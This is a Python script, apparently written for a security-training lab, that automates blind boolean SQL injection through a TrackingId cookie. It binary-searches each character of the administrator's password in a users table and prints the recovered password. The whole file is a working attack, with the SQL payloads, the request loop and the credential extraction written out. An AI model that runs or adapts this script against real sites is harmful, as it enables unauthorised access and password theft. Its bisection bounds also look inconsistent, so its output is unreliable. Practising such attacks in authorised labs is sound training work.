import requests
from   datetime import datetime

# Class to append decoded characters
class SenhaDecod():         
    def __init__(self):   
        self.Algarismo = None  
        self.Letra = None
        
#  Variable declaration
# ============================================================
url             = ' -- Endereco do servidor -- '
valorCookie     = " -- Numero do Cookie --"
labelResposta   = "Welcome back!"
usuario         ='administrator'
strSenhaDecod   = ""
unicode         = 127 
tamanhoSenha    = 20
algarismosSenha = [] 
offSetSenha     = []
dicAtaque       = []
# ============================================================
# Function to check if SQL Injection and ASCII are been working 
def bootstrap(parametro):
    response=requests.get(url,cookies=parametro) 
    return (response.text.find(labelResposta) > 0)    

def injecaoAoServidor(inicio, fim, posicao,tipo): 
    print(f'Inicio: { inicio } = Fim: { fim }')
    if tipo == 1:
       sqlInjection  =" AND (SELECT ASCII((SUBSTRING(password,'"+ str(posicao) +"',1))) FROM users WHERE username='"+ usuario +"')>="+ str(dicAtaque[inicio])
       sqlInjection +=" AND (SELECT ASCII((SUBSTRING(password,'"+ str(posicao) +"',1))) FROM users WHERE username='"+ usuario +"')<"+ str(dicAtaque[fim]) + ' --'
    else:
       sqlInjection  =" AND (SELECT ASCII((SUBSTRING(password,'"+ str(posicao) +"',1))) FROM users WHERE username='"+ usuario +"') ="+ str(dicAtaque[inicio]) + ' --'

    ck={"TrackingId": valorCookie + "'" +sqlInjection } 
    response=requests.get(url,cookies=ck)
    return (response.text.find(labelResposta) > 0) 
    
def marcaExecucao(periodo):
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    print(f'{periodo} : {current_time}')
    
def realizaParticao(arr,low,high,posicao): 
    if  high >= low: 
        mid = (high + low) // 2

        # Divide the search between two blocks 
        esquerda = injecaoAoServidor(low,mid + 1, posicao,1) 
        direita  = injecaoAoServidor(mid + 1,high,posicao,1)
            
        if esquerda: 
           print(f'Particionando:{low} == {mid -1}')
           realizaParticao(arr, low ,mid -1, posicao)
        else:        
           print(f'Particionando:{mid +1} == { high }')
           realizaParticao(arr, mid +1,high, posicao)   
    else: 
        objSenha = SenhaDecod() 
        objSenha.Algarismo = posicao 
        objSenha.Letra = str(chr(dicAtaque[low])) 
        print(f'Finded Character: { str(chr(dicAtaque[low])) }')
        algarismosSenha.append(objSenha)

reqErro    = bootstrap({"TrackingId": valorCookie + "'"}) 
reqSucesso = bootstrap({"TrackingId": valorCookie + "' OR (SELECT ASCII(substring(username,'1',1))  FROM users WHERE username='administrator')=97 --'" })

if (reqSucesso == True and reqErro == False):
    # If SQL Injection is working  
    # Make the arrays   
    for pedacoSenha in range(tamanhoSenha):
        offSetSenha.append(pedacoSenha)
    
    for caractere in range(unicode):
        dicAtaque.append(caractere)
    
    # Execution Starts 
    marcaExecucao("Execution Starts")

    # Recursive call
    # ====================================================================
    for posicao in offSetSenha: 
        print(f' =========== Posicao { posicao + 1 } ===================')
        realizaParticao(dicAtaque,0,len(dicAtaque)-1,posicao + 1)  
    
    # Show Password in Prompt
    # ====================================================================
    for parteSenha  in algarismosSenha: 
        strSenhaDecod += parteSenha.Letra 
    
    print(f'Senha codificada:{ strSenhaDecod }')
    marcaExecucao("Execution ends")
else: 
    print("An error are be throwed")